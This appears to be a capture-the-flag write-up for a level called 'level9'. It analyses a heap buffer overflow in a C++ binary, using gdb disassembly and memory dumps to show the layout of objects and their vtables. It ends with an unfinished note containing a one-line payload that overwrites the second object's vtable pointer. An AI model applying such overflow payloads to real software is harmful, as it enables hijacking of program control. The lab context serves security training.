## C++ is bad too (level9)

This level's [binary](level9/source.cpp) is written in C++. It contains an _N_
class which stores a 100-bytes long character buffer and an int. The character
buffer contents are set with the _setAnnotation_ method. So this binary takes at
least one argument (or it exits) and creates two instances of the class with
C++'s "new" keyword. This basically performs an allocation and sets the int
member of the struct to the given value. There is also two operator functions,
one for '+' and an other for '-', which simply adds or substracts the int member
values and returns the result as an int.

So the 2 N instances, let's call them _a_ and _b_, are initialized with 5 and 6
respectively. Then the _setAnnotation_ method is called on _a_ and it copies the
argument provided by the user directly to the member buffer without checking its
length which makes this susceptible to a buffer overflow attack.

Lets see the memory layout after all this:

```shell
# run gdb on the binary
gdb ./level9
# disassemble main to see where to break
(gdb) disass main
...
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt> # a is allocated
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei> # a is initialized to 5
...
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt> # b is allocated
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei> # b is initialized to 6
...
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
...
# break after a's allocation to get its address
(gdb) b *0x0804861c
Breakpoint 1 at 0x0804861c
# break after b's allocation for the same reason
(gdb) b *0x0804863e
Breakpoint 2 at 0x0804863e
# break after the setAnnotation call
(gdb) b *0x0804867c
Breakpoint 3 at 0x804867c
# start the program with an argument
(gdb) run "aaaabbbbccccddddeeeefghijklm"
Starting program: /home/user/level9/level9 "aaaabbbbccccddddeeeefghijklm"

Breakpoint 1, 0x0804861c in main ()
# see a's address
(gdb) x $eax
0x804a008:      0x00000000
# go to second breakpoint
(gdb) c
Continuing.

Breakpoint 2, 0x0804863e in main ()
# see b's address
(gdb) x $eax
0x804a078:      0x00000000
# go to last breakpoint
(gdb) c
Continuing.

Breakpoint 3, 0x0804867c in main ()
```

Now from there we can see that b is located 112 bytes after _a_. This makes
sense since the allocation function in both cases takes a parameter set to
"0x6c", 108 in decimal, which we can guess is the size of the class instance.
From these informations we can see the memory layout of _a_ and _b_:

```
# print 224 bytes of memory starting from a's address
(gdb) x/56wx 0x804a008
0x804a008:      0x08048848      0x61616161      0x62626262      0x63636363
0x804a018:      0x64646464      0x65656565      0x69686766      0x6d6c6b6a
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
```

The line starts with the address of the class' vtable: 0x08048848. We can see it
again 7 lines down at b's address (0x804a078). Then there's the character buffer
filled with our input (from 0x804a00c to 0x804a028). Finally, at the end of the
7th line there is a word containing the value 5 (at 0x804a070) which was _a_'s
initialization value. _b_ is layed out simirlarly but with an empty character
buffer and its value set to 6 on the last line (at 0x804a0e0).

#### TEMP (to be reworked)
* info about vtables *
overwrite b's vtable address and replace it by "bbbb":
./level9 "$(python -c 'print "a" * 108 + "bbbb"')"
#### TEMP
